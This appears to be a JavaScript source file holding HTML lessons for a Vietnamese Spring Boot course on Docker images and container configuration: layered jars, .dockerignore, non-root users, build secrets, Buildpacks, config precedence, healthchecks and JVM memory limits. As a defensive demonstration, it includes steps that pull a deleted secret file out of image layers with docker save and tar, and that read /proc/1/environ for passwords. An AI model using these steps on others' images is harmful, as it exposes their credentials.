  <li><strong>Layered jar.</strong> <code>java -Djarmode=tools -jar app.jar extract --layers --launcher</code> tách jar Spring Boot thành bốn thư mục theo <code>BOOT-INF/layers.idx</code>: <code>dependencies</code> (71,9 MB, đổi khi POM đổi), <code>spring-boot-loader</code> (618 kB), <code>snapshot-dependencies</code> (ở đây rỗng) và <code>application</code> (279 kB, lớp và tài nguyên của bạn). Mỗi thư mục là một <code>COPY</code> riêng, tức một lớp riêng, xếp từ "hiếm khi đổi" tới "đổi mỗi commit".</li>
  <li><strong>Kết quả</strong>: sửa một dòng Java ⇒ một lớp mới <strong>279 kB</strong>. Registry và mọi máy chủ đã có sẵn 72 MB còn lại.</li>
  <li><strong><code>USER labflow</code></strong> với uid cố định (10001): tiến trình không phải root trong container.</li>
  <li><strong><code>JAVA_TOOL_OPTIONS=-XX:MaxRAMPercentage=75</code></strong>: bài 17.2 sẽ đo vì sao dòng này quan trọng.</li>
</ul>
<div class="callout info"><p><strong>Một bất ngờ ở lần chạy đầu.</strong> Lần đầu "sửa một dòng", thứ được sửa là một chú thích. Kết quả: <code>lớp mới v1→v2: 0</code> — không lớp mới nào. Chú thích trên cùng dòng cho ra các tệp <code>.class</code> giống hệt từng byte, thư mục <code>application/</code> sau khi tách có cùng checksum, và BuildKit dùng lại lớp trong cache. Cùng chỗ sửa đó, fat jar vẫn sinh một lớp 71,9 MB mới, vì jar build lại là một tệp zip mới. Lớp được nhận diện theo nội dung, không theo ý định của bạn.</p></div>

<h3>4. <code>.dockerignore</code>: thứ không bao giờ rời máy bạn</h3>
${MA171_IGNORE}
<p>Docker gửi build context (thư mục sau dấu chấm trong <code>docker build … .</code>) cho bộ build trước khi chạy bước đầu tiên. Không có tệp này, bản A đã gửi 72,32 MB, gồm cả <code>.env</code> và <code>.git</code>. Có nó, <code>target/</code>, <code>.git/</code> và <code>.env</code> không thể lọt vào lớp nào, dù sau này có ai viết thêm dòng <code>COPY</code> nào. Nhớ nhanh: <code>.gitignore</code> bảo vệ repo, <code>.dockerignore</code> bảo vệ image — cần cả hai.</p>

<h3>5. Chọn image nền</h3>
<table>
  <thead><tr><th>Nền</th><th>Bạn có gì</th><th>Khi nào</th></tr></thead>
  <tbody>
    <tr><td><code>maven:3.9-eclipse-temurin-21</code> / <code>eclipse-temurin:21-jdk</code></td><td>Trình biên dịch, Maven, công cụ (riêng image JDK đã 751 MB trên máy này)</td><td>Chỉ ở tầng <em>build</em></td></tr>
    <tr><td><code>eclipse-temurin:21-jre</code></td><td>Ubuntu + JRE; có shell và <code>curl</code> (tiện cho healthcheck, bài 17.2)</td><td>Lựa chọn mặc định của LabFlow</td></tr>
    <tr><td><code>…-jre-alpine</code></td><td>Nhỏ hơn, nhưng dùng musl thay glibc</td><td>Khi bạn đã thử thư viện native và cách phân giải DNS trên musl</td></tr>
    <tr><td>Distroless / Buildpacks "tiny"</td><td>Không shell, không trình quản lý gói</td><td>Bề mặt tấn công nhỏ nhất; gỡ lỗi bằng <code>docker debug</code> hoặc container tạm</td></tr>
  </tbody>
</table>
<p>Ghim nền theo tag (<code>21-jre</code>) và để bot (Dependabot, bài 17.3) đề xuất bản mới; ghim theo digest (<code>@sha256:…</code>) cho build lặp lại được, nhưng bản vá bảo mật chỉ tới khi bạn tự nâng.</p>

<h3>6. Không chạy bằng root — vì sao một dòng lại quan trọng</h3>
<p>Container không phải máy ảo: nó là một tiến trình trên nhân của máy chủ, được bọc bằng namespace. Tháng 2/2019, <strong>CVE-2019-5736</strong> cho thấy một tiến trình chạy bằng root trong container có thể ghi đè tệp <code>runc</code> của máy chủ và chiếm root của máy chủ vào lần tới có người chạy <code>docker exec</code>. Cuộc tấn công cần root bên trong container. Image nào bạn giao đi cũng nên kết thúc bằng dòng <code>USER</code> với uid dạng số (<code>runAsNonRoot</code> của Kubernetes chỉ kiểm được uid dạng số). Bản A và B: <code>uid=0(root)</code>; bản C: <code>uid=10001(labflow)</code>.</p>

<h3>7. 🕵️ Góc hacker — bí mật bạn tưởng đã "xoá"</h3>
<p>Một kiểu có thật: lúc build cần mật khẩu (repo Maven nội bộ, một CSDL để sinh mã), nên Dockerfile chép <code>.env</code> vào, dùng xong thì xoá; còn token thì truyền bằng <code>--build-arg</code>:</p>
${MA171_LO}
${OUT171_LO}
<p><code>ls</code> nói tệp đã mất, và nó mất thật ở lớp <em>cuối</em>. Nhưng mỗi lớp là một tệp tar được giữ mãi trong image: <code>docker save</code> cộng <code>tar</code> lấy lại nguyên <code>.env</code> từ lớp của bước <code>COPY</code>. Còn build argument mà <code>RUN</code> dùng tới thì được ghi nguyên văn trong lịch sử image — và cũng đã in ra log build, thứ mà trong CI thường cả dự án đọc được.</p>
<p>Đây không phải lý thuyết. Nhóm nghiên cứu ở RWTH Aachen quét 337 171 image công khai trên Docker Hub và các registry riêng, công bố năm 2023: khoảng 8,5% chứa bí mật — khoá riêng và khoá API — nhiều cái vẫn đang được máy chủ thật dùng.</p>
<p><strong>Cách sửa: secret mount.</strong> Bí mật được gắn vào đúng một bước <code>RUN</code> dưới dạng tệp tạm (hoặc biến môi trường) và không bao giờ thành một lớp; BuildKit còn che nó trong log:</p>
${MA171_SECRET}
${OUT171_SECRET}
<div class="callout warn"><p><strong>Nếu bí mật đã lỡ đi theo image</strong>, xoá tag là chưa đủ: có thể ai đó đã kéo về rồi, và lớp đó có thể còn trong cache của registry và máy chủ. Hãy đổi bí mật (mật khẩu mới, khoá mới), rồi mới dọn. Bí mật lúc chạy (mật khẩu CSDL mà LabFlow cần khi chạy) hoàn toàn không thuộc về image — chúng đến từ biến môi trường hoặc tệp được gắn vào lúc <code>docker run</code> (bài 17.2).</p></div>

<h3>8. Không cần Dockerfile: Cloud Native Buildpacks</h3>
<p>Plugin Maven của Spring Boot build được image mà không cần Dockerfile, bằng Paketo Buildpacks:</p>
${OUT171_BP}
<ul>
  <li>Buildpacks nhận ra đây là ứng dụng Java, chọn một JRE (BellSoft Liberica 21), áp dụng đúng ý tưởng layered jar, sinh SBOM (syft) và đặt user không phải root (<code>1002:1001</code>).</li>
  <li><strong>"46 years ago"</strong> là cố ý: ngày tạo được đóng cứng ở 01/01/1980 để cùng đầu vào cho cùng digest (build lặp lại được).</li>
  <li>Image chạy <strong>không có shell</strong>: lệnh <code>id</code> không tồn tại. Kẻ tấn công có ít thứ để dùng hơn — và bạn cũng không có <code>curl</code> cho healthcheck.</li>
  <li>Một <strong>bộ tính bộ nhớ</strong> tự đặt heap lúc khởi động: với giới hạn 1 GB nó chọn <code>-Xmx400197K</code> (≈ 391 MB) sau khi chừa chỗ cho metaspace, code cache và 250 ngăn xếp luồng — dè dặt hơn <code>MaxRAMPercentage=75</code> (bài 17.2).</li>
  <li>Lần build đầu mất 293 giây (kéo builder 1,26 GB và tải JRE); các lần sau dùng lại một volume cache.</li>
</ul>
<table>
  <thead><tr><th></th><th>Dockerfile tự viết (bản C)</th><th>Buildpacks</th></tr></thead>
  <tbody>
    <tr><td>Kiểm soát</td><td>Từng dòng là của bạn</td><td>Cấu hình bằng biến <code>BP_*</code></td></tr>
    <tr><td>Cập nhật nền</td><td>Sửa <code>FROM</code>, build lại</td><td>"rebase" thay lớp hệ điều hành mà không build lại ứng dụng</td></tr>
    <tr><td>Hợp với</td><td>Nhóm muốn đọc và review được cách build; đồ án sinh viên</td><td>Công ty có nhiều service build cùng một kiểu</td></tr>
  </tbody>
</table>

<h3>So với Node.js</h3>
<p>Khoá Node.js đo đúng những ý này trên một ứng dụng Express — cỡ image, thứ tự lớp cache, bí mật trong lớp (bài 17.1, 17.2 và 17.4 của <a href="/courses/nodejs/learn">khoá Node.js</a>). Có hai khác biệt riêng của Java: đầu ra là một jar phải được <em>tách</em> thành các lớp mới hưởng được cache (còn <code>node_modules</code> của Node vốn đã là thư mục riêng), và runtime là JVM, nên chọn image nền nghĩa là chọn "JRE nào", và cấu hình bộ nhớ cần cẩn thận (17.2).</p>

<h3>Khi đi làm</h3>
<p>Ở một nhóm outsourcing, Dockerfile được review như mã. Những nhận xét review bạn sẽ viết hoặc nhận: "<code>COPY . .</code> đứng trước bước tải thư viện — dời xuống", "thiếu <code>.dockerignore</code>", "chạy bằng root", "truyền bí mật bằng <code>--build-arg</code>". Pipeline CI (17.3) thường thêm một công cụ quét đánh trượt build vì những lỗi này.</p>

<h3>🎤 Phỏng vấn viên sẽ hỏi</h3>
<ol>
  <li><strong>"Vì sao build nhiều tầng cho Spring Boot?"</strong> — Lúc build cần JDK và Maven; lúc chạy chỉ cần JRE và jar. Nhiều tầng giữ công cụ và mã nguồn ngoài image giao đi (nhỏ hơn, ít lỗ hổng hơn) và cho tầng build cache thư viện.</li>
  <li><strong>"Layered jar là gì, được lợi gì?"</strong> — Spring Boot tách được fat jar thành dependencies, loader, snapshot dependencies và application. Chép thành các lớp riêng thì sửa mã chỉ giao một lớp nhỏ (ở đây 279 kB) thay vì cả jar 72 MB.</li>
  <li><strong>"Truyền bí mật cho docker build thế nào?"</strong> — <code>RUN --mount=type=secret</code>. Không dùng <code>ARG</code>/<code>ENV</code> (ghi vào lịch sử), không <code>COPY</code> rồi <code>rm</code> (vẫn nằm ở lớp trước). Bí mật lúc chạy thì đưa vào lúc chạy, không bao giờ nằm trong image.</li>
  <li><strong>"Sao không chạy root trong container?"</strong> — Container dùng chung nhân với máy chủ; root bên trong cộng một lỗi runtime (CVE-2019-5736) thành root của máy chủ. Dùng <code>USER</code> với uid dạng số.</li>
  <li><strong>"Dockerfile hay Buildpacks?"</strong> — Buildpacks cho mặc định an toàn, không có tệp phải bảo trì và rebase được lớp hệ điều hành; Dockerfile cho toàn quyền kiểm soát và dễ review. Cách nào cũng được nếu kết quả có chia lớp, không root và không chứa bí mật.</li>
</ol>

<h3>🧪 Thực hành (30 phút)</h3>
<div class="callout ok"><ol>
  <li>Build bản A cho dự án của bạn (hoặc LabFlow) rồi chạy <code>docker run --rm &lt;image&gt; ls -a</code>. Liệt kê mọi thứ bên trong lẽ ra không được có.</li>
  <li>Thêm <code>.dockerignore</code>, đổi sang Dockerfile nhiều tầng chia lớp, rồi sửa một chuỗi trong một controller và build lại. Bao nhiêu lớp đổi, lớp mới nặng bao nhiêu? Giờ chỉ sửa một chú thích — đoán trước, rồi đo.</li>
  <li>Build một image chép tệp <code>secret.txt</code> vào rồi xoá ở bước kế. Lấy lại tệp đó từ <code>docker save</code> mà không chạy container.</li>
</ol></div>
${giai('Xem đáp án', `<p>1. Với LabFlow: <code>.env</code> (có bí mật thật), <code>.git</code>, <code>target/</code>, nguyên <code>src/</code>, Maven và JDK. Tiến trình chạy bằng <code>uid=0</code>.</p><p>2. Một lớp, lớp <code>application/</code>, vài trăm kB (LabFlow: 279 kB). Chỉ sửa chú thích: không lớp mới nào, vì lớp Java biên dịch ra giống hệt và BuildKit cache theo nội dung. Nếu thấy lớp thư viện 72 MB đổi thì thứ tự <code>COPY</code> của bạn sai hoặc POM đã đổi.</p><p>3. <code>docker save img -o img.tar &amp;&amp; mkdir x &amp;&amp; tar -xf img.tar -C x</code>, rồi với mỗi tệp trong <code>x/blobs/sha256/</code> chạy <code>tar -tf</code> tìm <code>secret.txt</code>; <code>tar -xOf &lt;lớp&gt; secret.txt</code> in nó ra. <code>rm</code> chỉ thêm một dấu "whiteout" ở lớp sau.</p>`)}

<h3>🗂 Thuật ngữ</h3>
<ul>
  <li><strong>Build context</strong> — các tệp gửi cho bộ build; được lọc bằng <code>.dockerignore</code>.</li>
  <li><strong>Lớp (layer)</strong> — một tệp tar chứa thay đổi hệ thống tệp của một bước Dockerfile; cache theo nội dung, dùng chung giữa các image.</li>
  <li><strong>Build nhiều tầng (multi-stage)</strong> — nhiều <code>FROM</code> trong một Dockerfile; chỉ tầng cuối được giao đi.</li>
  <li><strong>Layered jar</strong> — jar Spring Boot tách theo <code>layers.idx</code> thành dependencies / loader / snapshot-dependencies / application.</li>
  <li><strong>Cache mount</strong> — <code>RUN --mount=type=cache</code>: thư mục giữ qua các lần build nhưng không bao giờ vào image.</li>
  <li><strong>Secret mount</strong> — <code>RUN --mount=type=secret</code>: bí mật chỉ một bước thấy, không bao giờ được lưu.</li>
  <li><strong>Buildpacks</strong> — công cụ biến mã nguồn hoặc jar thành image không cần Dockerfile (Paketo cho Spring Boot).</li>
  <li><strong>Build lặp lại được (reproducible)</strong> — cùng đầu vào, cùng digest (Buildpacks đóng ngày ở 1980).</li>
</ul>

<h3>📌 Tóm tắt</h3>
<ul>
  <li>Dockerfile ngây thơ với LabFlow: 1,34 GB, root, có <code>.env</code> và <code>.git</code> bên trong, 104,7 giây build lại sau một dòng sửa.</li>
  <li>Fat jar trên JRE: không còn công cụ, nhưng mỗi lần phát hành đẩy 71,9 MB, vẫn root.</li>
  <li>Nhiều tầng + chia lớp + <code>USER</code>: một dòng sửa ⇒ một lớp 279 kB; <code>uid=10001</code>.</li>
  <li><code>COPY</code> + <code>rm</code> và <code>--build-arg</code> đều làm lộ; dùng secret mount, đổi mọi bí mật đã lỡ đi theo image.</li>
  <li>Buildpacks: không Dockerfile, không root, không shell, build lặp lại được, có bộ tính bộ nhớ; lần đầu build chậm hơn.</li>
</ul>

<h3>📚 Học sâu</h3>
${tl('https://docs.spring.io/spring-boot/reference/packaging/container-images/efficient-images.html', '🧱', 'Spring Boot — Efficient container images', 'Chia lớp, layers.idx, tách jar.')}
${tl('https://docs.spring.io/spring-boot/maven-plugin/build-image.html', '📦', 'Plugin Maven của Spring Boot — build-image', 'Tuỳ chọn Buildpacks, biến BP_*.')}
${tl('https://docs.docker.com/build/building/secrets/', '🔑', 'Docker — Build secrets', 'Secret mount, đích env=.')}
${tl('https://docs.docker.com/build/cache/', '⚡', 'Docker — Build cache', 'Cache mất hiệu lực thế nào, cache mount.')}

<h3>Nguồn</h3>
<ul>
  <li>CVE-2019-5736 (thoát container qua runc), NVD, 02/2019.</li>
  <li>M. Dahlmanns và cộng sự, "Secrets Revealed in Container Images: An Internet-wide Study on Occurrence and Impact", ACM ASIA CCS 2023 (RWTH Aachen).</li>
  <li>Mọi số đo: LabFlow trên máy dựng bài của khoá, Docker 29.6.2, tháng 11/2026.</li>
</ul>
</div>
`;

// ===== Bài 17.2 =====
const MA172_PROPS = props("# application.properties của LabFlow (các dòng đọc từ môi trường)\nspring.datasource.url=${LABFLOW_DB_URL:jdbc:postgresql://localhost:5432/labflow}\nspring.datasource.username=${LABFLOW_DB_USER:labflow}\nspring.datasource.password=${LABFLOW_DB_PASSWORD:}\nlabflow.jwt.secret=${LABFLOW_JWT_SECRET}\nlabflow.cors.origins=${LABFLOW_CORS_ORIGINS:http://localhost:5173}\nlabflow.bootstrap.manager-password=${LABFLOW_MANAGER_PASSWORD:}\nlabflow.now=${LABFLOW_NOW:}\nmanagement.endpoints.web.exposure.include=health,info\nmanagement.endpoint.health.probes.enabled=true\nspring.data.redis.host=${LABFLOW_REDIS_HOST:localhost}");
const OUT172_CFG = out("# 1) không cho biết CSDL ở đâu ⇒ dùng mặc định trong application.properties (localhost)\n$ docker run … sb-c17-labflow:1.0.0\nApplication run failed\nConnection to localhost:5432 refused\n→ container: đã thoát, exit 1\n\n# 2) LABFLOW_DB_URL trỏ tới tên service \"db\" trong cùng mạng Docker\n$ docker run … -e LABFLOW_DB_URL=jdbc:postgresql://db:5432/labflow sb-c17-labflow:1.0.0\nStarted LabflowApplication in 17.947 seconds\n→ container: đang chạy\n\n# 3) thêm SPRING_DATASOURCE_URL (biến môi trường ghi đè thẳng spring.datasource.url của tệp)\n$ docker run … -e LABFLOW_DB_URL=…//db… -e SPRING_DATASOURCE_URL=jdbc:postgresql://khong-co:5432/labflow sb-c17-labflow:1.0.0\nApplication run failed\nUnknownHostException: khong-co\n→ container: đã thoát, exit 1\n\n# 4) thêm đối số dòng lệnh: thắng cả biến môi trường\n$ docker run … -e SPRING_DATASOURCE_URL=…khong-co… sb-c17-labflow:1.0.0 --spring.datasource.url=jdbc:postgresql://db:5432/labflow\nStarted LabflowApplication in 11.227 seconds\n→ container: đang chạy");
const OUT172_FLYWAY = out("$ docker run … sb-c17-labflow:1.0.0      # cùng CSDL, lần trước chạy với SPRING_PROFILES_ACTIVE=dev, lần này quên\norg.flywaydb.core.api.exception.FlywayValidateException: Validate failed: Migrations have failed validation\nDetected applied migration not resolved locally: dev labs.\nIf you removed this migration intentionally, run repair to mark the migration as deleted.\n→ container: đã thoát, exit 1");
const OUT172_HEALTH = out("$ docker run … --health-cmd \"curl -fsS -o /dev/null http://127.0.0.1:8080/actuator/health/readiness\" --health-interval 2s …\n  5.0 s  starting\n 20.9 s  healthy\n\n$ curl -s localhost:41870/actuator/health\n{\"groups\":[\"liveness\",\"readiness\"],\"status\":\"UP\"}\n$ curl -s localhost:41870/actuator/health/liveness\n{\"status\":\"UP\"}\n$ curl -s localhost:41870/actuator/health/readiness\n{\"status\":\"UP\"}\n\n# dừng Redis: CSDL vẫn sống, cache chết\n$ curl -s -w ' HTTP %{http_code}' localhost:41870/actuator/health\n{\"groups\":[\"liveness\",\"readiness\"],\"status\":\"DOWN\"} HTTP 503\n$ curl -s -w ' HTTP %{http_code}' localhost:41870/actuator/health/readiness\n{\"status\":\"UP\"} HTTP 200\nsau 7 s: docker inspect … Health.Status = healthy");
const OUT172_MEM = out("# với mỗi giới hạn: docker run --rm --memory M --cpus C eclipse-temurin:21-jdk java -XX:+PrintFlagsFinal -version\n--memory 512m --cpus 1 → MaxHeapSize = 128 MB, GC = SerialGC\n--memory 512m --cpus 2 → MaxHeapSize = 128 MB, GC = SerialGC\n--memory 1g   --cpus 1 → MaxHeapSize = 256 MB, GC = SerialGC\n--memory 1g   --cpus 2 → MaxHeapSize = 256 MB, GC = SerialGC\n--memory 2g   --cpus 1 → MaxHeapSize = 512 MB, GC = SerialGC\n--memory 2g   --cpus 2 → MaxHeapSize = 512 MB, GC = G1GC\n$ docker run --rm --memory 1g --cpus 2 eclipse-temurin:21-jdk java -XX:MaxRAMPercentage=75 -XX:+PrintFlagsFinal -version | grep MaxHeapSize\n   size_t MaxHeapSize                              = 805306368      (768 MB)\n\n$ docker run --rm --memory 1g --cpus 2 eclipse-temurin:21-jdk java -XshowSettings:system -version\nOperating System Metrics:\n    Provider: cgroupv2\n    Effective CPU Count: 2\n    CPU Quota: 200000us\n    Memory Limit: 1.00G\n    Memory & Swap Limit: 1.00G");
const MA172_MEM = java("/** Xin bộ nhớ heap từng khối 64 MB cho tới khi có chuyện. */\npublic class Mem {\n    public static void main(String[] args) throws Exception {\n        long max = Runtime.getRuntime().maxMemory() >> 20;\n        System.out.println(\"max heap = \" + max + \" MB, CPU thấy được = \" + Runtime.getRuntime().availableProcessors());\n        List<byte[]> giu = new ArrayList<>();\n        for (int i = 1; ; i++) {\n            giu.add(new byte[64 << 20]);              // mảng mới được điền 0 ⇒ trang bộ nhớ thật sự bị chạm\n            System.out.println(\"đã giữ \" + (i * 64) + \" MB\");\n            Thread.sleep(50);\n        }\n    }\n}");
const OUT172_OOM = out("$ docker run --name sb-c17-oom1 --memory 1g eclipse-temurin:21-jdk java -Xmx3g Mem.java\nmax heap = 2969 MB, CPU thấy được = 2\n…\nđã giữ 704 MB\nđã giữ 768 MB\nđã giữ 832 MB\n$ docker inspect -f \"exit={{.State.ExitCode}} OOMKilled={{.State.OOMKilled}}\" sb-c17-oom1\nexit=137 OOMKilled=true\n\n$ docker run --name sb-c17-oom2 --memory 1g eclipse-temurin:21-jdk java -XX:MaxRAMPercentage=75 -XX:+ExitOnOutOfMemoryError Mem.java\nmax heap = 742 MB, CPU thấy được = 2\n…\nđã giữ 576 MB\nđã giữ 640 MB\nTerminating due to java.lang.OutOfMemoryError: Java heap space\nexit=3 OOMKilled=false");
const MA172_CHAM = java("/** CHỈ profile dev: một request chậm có chủ ý để thử tắt êm (bài 17.2). */\n@Profile(\"dev\")\n@RestController\nclass ChamDemo {\n    private static final Logger log = LoggerFactory.getLogger(ChamDemo.class);\n\n    @GetMapping(\"/dev/cham\")\n    String cham(@RequestParam(defaultValue = \"5000\") long ms) throws InterruptedException {\n        log.info(\"bắt đầu một việc {} ms\", ms);\n        Thread.sleep(ms);\n        log.info(\"xong việc {} ms\", ms);\n        return \"xong sau \" + ms + \" ms\\n\";\n    }\n}");
const MA172_START = bash("#!/bin/sh\n# script khởi động \"cho tiện\": in một dòng rồi gọi java (quên exec)\necho \"khởi động LabFlow...\"\njava org.springframework.boot.loader.launch.JarLauncher \"$@\"");
const OUT172_TAT = out("# năm lần chạy, cùng image LabFlow, cùng request 5 s (lần E: 15 s); docker stop mặc định chờ 10 s\n### A. exec form (Dockerfile của dự án)\n$ docker top sb-c17-app -o pid,comm\n  PID trên máy 1955715  java\n$ curl localhost:41870/dev/cham?ms=5000 &   # một request đang chạy\n$ time docker stop sb-c17-app\ndocker stop mất 4.6 s\ncurl: HTTP 200 sau 5.132485 s\ncurl exit 0\nxong sau 5000 ms\nexit code của container: 143\n[nio-8080-exec-1] bắt đầu một việc 5000 ms\n[ionShutdownHook] Commencing graceful shutdown. Waiting for active requests to complete\n[nio-8080-exec-1] xong việc 5000 ms\n[tomcat-shutdown] Graceful shutdown complete\n\n### B. exec form + server.shutdown=immediate\n$ docker top sb-c17-app -o pid,comm\n  PID trên máy 1956573  java\n$ curl localhost:41870/dev/cham?ms=5000 &   # một request đang chạy\n$ time docker stop sb-c17-app\ndocker stop mất 0.4 s\ncurl: HTTP 000 sau 1.043267 s\ncurl exit 52\nexit code của container: 143\n[nio-8080-exec-1] bắt đầu một việc 5000 ms\n\n### C. ENTRYPOINT là script start.sh quên exec\n$ docker top sb-c17-app -o pid,comm\n  PID trên máy 1957173  start.sh\n  PID trên máy 1957236  java\n$ curl localhost:41870/dev/cham?ms=5000 &   # một request đang chạy\n$ time docker stop sb-c17-app\ndocker stop mất 10.4 s\ncurl: HTTP 200 sau 5.114372 s\ncurl exit 0\nxong sau 5000 ms\nexit code của container: 137\nkhởi động LabFlow...\n[nio-8080-exec-1] bắt đầu một việc 5000 ms\n[nio-8080-exec-1] xong việc 5000 ms\n\n### D. shell form: ENTRYPOINT java …\n$ docker top sb-c17-app -o pid,comm\n  PID trên máy 1967687  sh\n  PID trên máy 1967875  java\n$ curl localhost:41870/dev/cham?ms=5000 &   # một request đang chạy\n$ time docker stop sb-c17-app\ndocker stop mất 10.6 s\ncurl: HTTP 200 sau 5.123521 s\ncurl exit 0\nxong sau 5000 ms\nexit code của container: 137\n[nio-8080-exec-2] bắt đầu một việc 5000 ms\n[nio-8080-exec-2] xong việc 5000 ms\n\n### E. exec form, request 15 s > 10 s của docker stop\n$ docker top sb-c17-app -o pid,comm\n  PID trên máy 1977583  java\n$ curl localhost:41870/dev/cham?ms=15000 &   # một request đang chạy\n$ time docker stop sb-c17-app\ndocker stop mất 10.6 s\ncurl: HTTP 000 sau 11.094029 s\ncurl exit 52\nexit code của container: 137\n[nio-8080-exec-1] bắt đầu một việc 15000 ms\n[ionShutdownHook] Commencing graceful shutdown. Waiting for active requests to complete");
const OUT172_BIMAT = out("# A) bí mật qua biến môi trường\n$ docker run -d --name sb-c17-app -e LABFLOW_DB_PASSWORD=… -e LABFLOW_JWT_SECRET=… sb-c17-labflow:1.0.0\nStarted LabflowApplication in 11.375 seconds\n$ docker inspect -f \"{{range .Config.Env}}{{println .}}{{end}}\" sb-c17-app | grep -E \"PASSWORD|SECRET\"\nLABFLOW_DB_PASSWORD=•••••  (bài che; lệnh in nguyên văn)\nLABFLOW_JWT_SECRET=•••••  (bài che; lệnh in nguyên văn)\n$ docker exec sb-c17-app sh -c \"tr \\\"\\\\0\\\" \\\"\\\\n\\\" < /proc/1/environ | grep -c PASSWORD\"\n1\n\n# B) bí mật qua tệp gắn vào /run/secrets + spring.config.import=configtree:\n$ ls -l secrets/\n-rw-r--r--. 19 LABFLOW_DB_PASSWORD\n-rw-r--r--. 64 LABFLOW_JWT_SECRET\n$ docker run -d --name sb-c17-app -v ./secrets:/run/secrets:ro -e SPRING_CONFIG_IMPORT=configtree:/run/secrets/ sb-c17-labflow:1.0.0\nStarted LabflowApplication in 11.017 seconds\n$ docker inspect -f \"{{range .Config.Env}}{{println .}}{{end}}\" sb-c17-app | grep -cE \"PASSWORD|SECRET\"\n0\n$ curl -s localhost:41870/actuator/health\n{\"groups\":[\"liveness\",\"readiness\"],\"status\":\"UP\"}");

const L172_EN = `
<div class="ml-en">
<span class="eyebrow">Chapter 17 · Lesson 17.2 · Docker and CI</span>
<h2>Configuration for containers</h2>
<p class="lead">The image from 17.1 is the same on your laptop, in CI and on the server. What changes between them is configuration — where the database is, which secrets to use, how much memory the JVM may take, how the process is told to stop. This lesson runs the LabFlow image in a Docker network next to PostgreSQL and Redis and measures five things that bite every Spring Boot team the first week they deploy: <code>localhost</code> inside a container, which configuration source wins, what a healthcheck should ask, how much heap a JVM takes in a 1 GB container (and what happens when you guess wrong), and whether a stop signal reaches Java at all.</p>

<h3>Everyday picture first</h3>
<p>A chef who travels between restaurants brings the same recipe book (the image). In each kitchen the manager pins a card on the wall: "the market is on Nguyễn Trãi street, the fridge code is 4821, you have two burners" (the environment). A good chef reads the card instead of shouting "the market is next door!" — which is only true in their home kitchen. And when the manager says "closing time", the chef finishes the plates already on the stove before leaving, instead of walking out mid-dish.</p>

<h3>1. One image, configuration from the environment</h3>
${MA172_PROPS}
<p>Every value that differs between environments is a placeholder <code>\${NAME:default}</code>. The defaults make <code>mvn spring-boot:run</code> work on a developer machine; in a container the environment supplies the real values. The JWT secret has <em>no</em> default on purpose: without it the application refuses to start, instead of signing tokens with a value everybody can read on GitHub. Run four ways against the same image (in every experiment of this lesson the API container joins a Docker network <code>sb-c17-n</code> next to containers named <code>db</code> and <code>redis</code>, with <code>--memory 1g --cpus 2</code>, published on <code>127.0.0.1:41870</code>):</p>
${OUT172_CFG}
<ul>
  <li><strong>Run 1</strong>: inside a container, <code>localhost</code> is the container itself. PostgreSQL is another container, reachable by its <strong>service name</strong> (<code>db</code>) on the shared Docker network.</li>
  <li><strong>Run 3</strong>: <code>SPRING_DATASOURCE_URL</code> beat the line in <code>application.properties</code>. This is <em>relaxed binding</em>: Spring maps an environment variable to a property by lower-casing it and turning <code>_</code> into <code>.</code> — so <code>SPRING_DATASOURCE_URL</code> ⇒ <code>spring.datasource.url</code>. Environment variables rank above property files.</li>
  <li><strong>Run 4</strong>: a command-line argument (<code>--spring.datasource.url=…</code>, appended after the image name) beat the environment variable.</li>
</ul>
<p>The order that matters in practice, highest first: command-line arguments → <code>SPRING_APPLICATION_JSON</code> → OS environment variables → <code>application-{profile}.properties</code> → <code>application.properties</code> → defaults in code. When a value is "mysteriously" ignored, someone higher in this list set it.</p>
<div class="callout warn"><p><strong>A real failure from this lesson.</strong> The health experiment below first ran the image against the same database the dev-profile runs had used, but without <code>SPRING_PROFILES_ACTIVE=dev</code>:</p>
${OUT172_FLYWAY}
<p>The dev profile adds a folder of sample-data migrations (<code>db/dev</code>, Chapter 18). They had been applied; without the profile Flyway could not find them locally and refused to start. That is Flyway protecting you — the lesson is: one database per environment, and the profile is set explicitly in the deployment (compose file, Kubernetes manifest), never left to "whatever the default is".</p></div>

<h3>2. Healthchecks that an orchestrator can act on</h3>
<p>Actuator exposes two probes (enabled by <code>management.endpoint.health.probes.enabled=true</code>): <strong>liveness</strong> — "is this process broken beyond repair? restart me" — and <strong>readiness</strong> — "can I take traffic right now?". The overall <code>/actuator/health</code> also includes every dependency Spring knows about: database, Redis, disk.</p>
${OUT172_HEALTH}
<ul>
  <li>The container went from <code>starting</code> to <code>healthy</code> in about 21 s — the healthcheck called <code>/actuator/health/readiness</code> with <code>curl</code>, which the <code>eclipse-temurin:21-jre</code> image has.</li>
  <li>With Redis stopped, <code>/actuator/health</code> turned <code>DOWN</code> (HTTP 503) but readiness stayed <code>UP</code>, and Docker kept the container <code>healthy</code>. That is the intended design: restarting the API does not fix Redis, and a cache outage should not take the API down (lesson 17.4 shows LabFlow still answering from PostgreSQL). Alert on <code>/actuator/health</code>; let the orchestrator act on liveness and readiness.</li>
  <li>Never point a liveness probe at a dependency. If the database blips, every instance would be restarted at once — turning a 5-second blip into a full outage.</li>
</ul>

<h3>3. The JVM inside a memory limit</h3>
<p>Since Java 10 the JVM reads the container's cgroup limits instead of the host's. What it decides from them surprises most people:</p>
${OUT172_MEM}
<ul>
  <li><strong>Default heap = 25% of the limit.</strong> In a 1 GB container your Spring Boot app gets a 256 MB heap and leaves 768 MB unused.</li>
  <li><strong>Below 2 CPUs or about 1.8 GB the JVM picks SerialGC</strong> (one thread, stop-the-world) instead of G1. A "small" container quietly changes your garbage collector.</li>
  <li><code>-XX:MaxRAMPercentage=75</code> gives a 768 MB heap in 1 GB and leaves 25% for everything that is <em>not</em> heap: metaspace (loaded classes), thread stacks, the JIT code cache, direct buffers used by the network stack.</li>
</ul>
<p>What happens when the heap setting ignores the limit? A small program that keeps 64 MB blocks:</p>
${MA172_MEM}
${OUT172_OOM}
<ul>
  <li><strong><code>-Xmx3g</code> in a 1 GB container</strong>: the JVM believed it had almost 3 GB. At 832 MB of heap (plus non-heap) the container hit 1 GB and the <strong>kernel</strong> killed it: exit 137, <code>OOMKilled=true</code>, no Java stack trace, no log line saying why. In production this looks like "the pod restarts randomly".</li>
  <li><strong><code>MaxRAMPercentage=75</code> + <code>ExitOnOutOfMemoryError</code></strong>: the JVM itself reported <code>OutOfMemoryError: Java heap space</code> and exited with code 3. You get a clear message, and the orchestrator restarts a process that is no longer in a half-broken state.</li>
  <li>Buildpacks (17.1) go further and compute <code>-Xmx</code> from the limit minus measured non-heap needs: 391 MB in 1 GB. LabFlow under real traffic used 382 MiB of its 1 GiB limit (Chapter 18).</li>
</ul>

